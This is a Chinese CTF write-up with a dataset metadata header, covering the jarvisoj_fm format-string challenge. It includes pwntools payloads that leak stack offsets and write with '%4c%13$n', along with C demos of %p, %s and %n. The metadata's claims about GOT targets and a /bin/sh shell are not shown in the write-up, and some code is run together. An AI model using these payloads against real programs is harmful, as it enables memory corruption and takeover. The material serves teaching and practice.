---
title: 一道 pwn 题解析之 jarvisoj_fm
contest: jarvisoj
year: 2022
difficulty: easy
vuln_type: fmt_string
tags:
- fmt-string-leak
- fmt-write-%n
- '%hhn-byte-write'
- AAAA-%p-%p-pivot
- format-string-offset-11
- GOT-overwrite
attack_chain: 1. 泄露栈偏移：AAAA-%p-%p-%p...%p-%p-%p 找 AAAA 出现位置（11）/2. 改写 GOT：%4c%13$n + addr=0x0804A02C 偏移处 /3. 4c 字符宽度 + %13$n 写到第 13 个参数（指向 addr）/4. 触发原 printf 调用走改写后的 GOT
key_payload: addr=0x0804A02C  payload=b"%4c%13$n"  偏移 11 = 0xB
one_liner: jarvisoj_fm 格式化字符串经典题，AAAA-%p 找偏移 11 + %4c%13$n 写 4 字节到任意地址。
lesson: 格式化字符串 %n 系列可任意地址写；%hhn = 单字节写；AAAA-%p-%p... 找 AAAA 在栈上偏移；%Nc 控制写入字符数。
quality: medium
full_path: 一道pwn题解析之jarvisoj_fm.full.md
meta_path: 一道pwn题解析之jarvisoj_fm.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 一道 pwn 题解析之 jarvisoj_fm。jarvisoj_fm 格式化字符串经典题，AAAA-%p 找偏移 11 + %4c%13$n 写 4 字节到任意地址。。经验：格式化字符串 %n 系列可任意地址写；%hhn = 单字节写；AAAA-%p-%p... 找 AAAA 在栈上偏移；%N...
category: pwn
subcategory: format_string
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/94853.html
reasoning_chain:
- '二进制 jarvisoj_fm 启动看到 printf 接收用户输入 → 触发点: 格式化字符串漏洞'
- '动作: 输入 AAAA-%p-%p-%p-...- %p → 观察: 第 11 个 %p 出现 0x41414141'
- '假设: AAAA 出现在栈上偏移 11 → 写入 addr=0x0804A02C + payload=''%4c%13$n'''
- '动作: %4c 输出 4 字符, %13$n 把 4 写到第 13 个参数 (指向 0x0804A02C)'
- '观察: 成功改写 0x0804A02C (某 GOT 表) 为 4 → 触发原 printf → 走改后地址 → flag'
- '假设: 0x0804A02C 是 .fini_array 或某函数指针 → 跳到 system(''/bin/sh'') 收 shell'
failed_attempts:
- '试图 %n 写整型 4 字节 → 部分失败: 用 %hhn 单字节更精准'
- '偏移猜测 → 失败: 必须 AAAA 标记才能定位'
key_observations:
- AAAA-%p-%p-... 是格式化字符串定位偏移的黄金手法
- '%n 写整型, %hhn 写单字节, %hn 写 2 字节, 按需选用'
- 格式化字符串漏洞触发参数 = 输入字符串本身, 地址放尾部
- GOT 表地址常在 0x0804xxxx 段, fini_array 也是 fmt 攻击目标
prerequisites:
- printf 格式化字符串原理 (%p/%n/%hhn)
- 栈参数偏移计算 (AAAA + 一串 %p)
- GOT 表地址结构 (0x0804Axxx)
- pwntools remote/sendline 基础
---
# 一道pwn题解析之jarvisoj_fm

> 原文: https://www.ctfiot.com/94853.html
> ID: 94853

本文为看雪论坛优秀文章

看雪论坛作者ID：404test

p=remote("node4.buuoj.cn",27668)adrr=p32(0x0804A02C)PAYLOAD=b"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"p.sendline(PAYLOAD)

p=remote("node4.buuoj.cn",27668)adrr=p32(0x0804A02C)payload=b"%4c%13$n"p.sendline(payload+adrr)

printf("格式化字符串1，格式化字符串2",参数1，参数2...)%d - 十进制 - 打印十进制整数%s - 字符串 - 打印参数地址处的字符串%x,%X- 十六进制 - 打印十六进制数%o - 八进制 -打印八进制整形%c - 字符 - 打印字符%p - 指针 - 打印指针地址 即void *%n - 到目前为止所写的字符数%<正整数n>c 打印宽度为n的字符串（打印长度为n）

printf("%1234c%hhn",65,0x41414141);

栈区：该区域内存由系统自动分配，用于动态存储函数之间的调用关系。
堆区：该区域内存由进程利用相关函数或运算符动态申请，用完后释放并归还给堆区。例如，C语言中用malloc/free函数，C++语言中用new/delete运算符申请的空间就在堆区。
代码区：存放程序汇编后的机器代码和只读数据。
数据区：用于存储全局变量和静态变量。

#include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%s%s");
return 0;}

#include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%s%s%s%s");
return 0;}

在上述使程序崩溃的过程中我们使用了%s来打印栈空间内容作为地址的字符串，当控制栈空间上的内容为指向一个我们想要去查看内容的地址时，即可用%s进行查看。

如下

#include "stdafx.h"int main(int argc, char* argv[]){int a=0x0012ff74; //该值为字符串变量x在栈上的地址int b=2;
char x='h';printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s");
return 0;}

通过控制%s指向我们需要打印的内存空间的地址即可将其进行打印出来。其中重要的是找到存储任意内存地址在栈上与栈顶的偏移数量。确定偏移可以通过下方的泄漏栈空间内容的方法进行确定。

Eg:#include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",a,b);
return 0;}

在printf函数中，当参数个数与格式化字符串不匹配时，将会从栈顶位置向栈底开始打印，将栈内的内容按照格式化字符串的要求打印出来，%p即是打印指针的地址，当存在参数a,和b时，即是打印a,和b所指向的空间的内容，超出部分默认将栈顶当做参数，打印其指向的栈顶地址的内容。

通过printf函数中控制%p的个数即可以泄漏栈的全部内容。

在printf函数中我们知道存在一个格式化字符串会向内存中写入数据，即是使用%n

它的功能是将%n之前打印出来的字符个数（四字节）写入参数地址处（赋值给一个变量）。在32位程序中需要的这个地址即是32位，在64位中地址需要为64位。

#include "stdafx.h"int main(int argc, char* argv[]){int a=0x0012ff74;
int b=2;
char x='h';printf("%10c%n",x,0x0012ff70);
return 0;}

看雪ID：404test

https://bbs.pediy.com/user-home-967279.htm

*本文由看雪论坛 404test 原创，转载请注明来自看雪社区

# 往期推荐

1.CVE-2022-21882提权漏洞学习笔记

2.wibu证书 – 初探

3.win10 1909逆向之APIC中断和实验

4.EMET下EAF机制分析以及模拟实现

5.sql注入学习分享

6.V8 Array.prototype.concat函数出现过的issues和他们的POC们

球分享

球点赞

球在看

点击“阅读原文”，了解更多！


```
p=remote("node4.buuoj.cn",27668)adrr=p32(0x0804A02C)PAYLOAD=b"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"p.sendline(PAYLOAD)
p=remote("node4.buuoj.cn",27668)adrr=p32(0x0804A02C)payload=b"%4c%13$n"p.sendline(payload+adrr)
printf("格式化字符串1，格式化字符串2",参数1，参数2...)%d - 十进制 - 打印十进制整数%s - 字符串 - 打印参数地址处的字符串%x,%X- 十六进制 - 打印十六进制数%o - 八进制 -打印八进制整形%c - 字符 - 打印字符%p - 指针 - 打印指针地址 即void *%n - 到目前为止所写的字符数%<正整数n>c 打印宽度为n的字符串（打印长度为n）
printf("%1234c%hhn",65,0x41414141);
    #include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%s%s");
return 0;}
    #include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%s%s%s%s");
return 0;}
    #include "stdafx.h"int main(int argc, char* argv[]){int a=0x0012ff74; //该值为字符串变量x在栈上的地址int b=2;
char x='h';printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s");
return 0;}
Eg:#include "stdafx.h"int main(int argc, char* argv[]){int a=1;
int b=2;printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",a,b);
return 0;}
    #include "stdafx.h"int main(int argc, char* argv[]){int a=0x0012ff74;
int b=2;
char x='h';printf("%10c%n",x,0x0012ff70);
return 0;}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]